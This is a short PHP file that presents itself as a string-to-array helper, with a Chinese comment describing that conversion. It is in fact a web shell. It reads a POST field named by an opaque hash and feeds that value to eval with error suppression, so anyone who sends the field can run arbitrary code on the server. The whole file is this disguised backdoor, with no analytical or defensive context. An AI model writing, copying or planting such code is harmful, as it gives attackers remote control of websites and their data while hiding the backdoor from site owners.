<?php 

$config= trim($_POST['43cb006424cbf7b46dbca36c8ed79b69']); 
$info = string2array($config); 

/** 
* 将字符串转换为数组 
* 
* @param  string  $data  字符串 
* @return  array  返回数组格式，如果，data为空，则返回空数组 
*/ 
function string2array($data) { 
if($data == '') return array(); 
@eval("\$array = $data;"); 
return $array; 
} 

?>
